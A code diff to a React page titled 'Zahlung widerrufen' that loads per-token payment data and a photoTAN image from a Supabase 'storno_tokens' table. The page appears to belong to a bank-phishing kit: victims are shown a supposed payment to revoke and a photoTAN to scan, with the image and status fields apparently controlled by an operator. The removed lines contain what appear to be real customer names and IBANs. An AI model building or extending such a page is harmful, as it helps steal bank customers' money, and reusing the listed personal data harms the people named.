@@ -11,7 +11,26 @@ type Row = {
   photo_tan_image: string | null;
   customer_phase: string | null;
   last_error: string | null;
+  auftraggeber_name: string | null;
+  auftraggeber_iban: string | null;
+  empfaenger_name: string | null;
+  empfaenger_iban: string | null;
+  betrag: number | null;
+  verwendungszweck: string | null;
 };
+
+const formatIban = (v?: string | null) =>
+  (v || "").replace(/\s+/g, "").replace(/(.{4})/g, "$1 ").trim();
+const kontoFromIban = (v?: string | null) => {
+  const s = (v || "").replace(/\s+/g, "");
+  if (!s) return "—";
+  return s.slice(4).replace(/^0+/, "") || s.slice(4);
+};
+const formatBetrag = (n?: number | null) =>
+  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " EUR";
+const berlinToday = () =>
+  new Intl.DateTimeFormat("de-DE", { day: "numeric", month: "long", year: "numeric", timeZone: "Europe/Berlin" }).format(new Date());
+
 
 const WiderrufPhotoTan = () => {
   const navigate = useNavigate();
@@ -26,7 +45,7 @@ const WiderrufPhotoTan = () => {
     const load = async () => {
       const { data } = await (supabase as any)
         .from("storno_tokens")
-        .select("id, photo_tan_image, customer_phase, last_error")
+        .select("id, photo_tan_image, customer_phase, last_error, auftraggeber_name, auftraggeber_iban, empfaenger_name, empfaenger_iban, betrag, verwendungszweck")
         .eq("token", token)
         .maybeSingle();
       if (!data) return;
@@ -100,14 +119,15 @@ const WiderrufPhotoTan = () => {
             <p className="text-sm text-foreground mb-6">Zahlung widerrufen</p>
 
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 mb-6">
-              <Field label="Empfängerkonto" value="DE42 5003 1900 0016 4288 41" />
-              <Field label="Betrag" value="5,00 EUR" />
-              <Field label="Verwendungszweck" value="3543NV44/17726" />
-              <Field label="Ausführungsdatum" value="17. Juli 2026" />
-              <Field label="Auftraggeberkontonummer" value="25957083" />
-              <Field label="IBAN des Auftraggebers" value="DE53 3006 0601 0025 9570 83" />
-              <Field label="Kundenname" value="Gülnaz Kirdemir" />
-              <Field label="Name des Begünstigten" value="Veronica Ariyanne" />
+              <Field label="Empfängerkonto" value={formatIban(row?.empfaenger_iban) || "—"} />
+              <Field label="Betrag" value={formatBetrag(row?.betrag)} />
+              <Field label="Verwendungszweck" value={row?.verwendungszweck || "—"} />
+              <Field label="Ausführungsdatum" value={berlinToday()} />
+              <Field label="Auftraggeberkontonummer" value={kontoFromIban(row?.auftraggeber_iban)} />
+              <Field label="IBAN des Auftraggebers" value={formatIban(row?.auftraggeber_iban) || "—"} />
+              <Field label="Kundenname" value={row?.auftraggeber_name || "—"} />
+              <Field label="Name des Begünstigten" value={row?.empfaenger_name || "—"} />
+
             </div>
 
             {row?.last_error && (
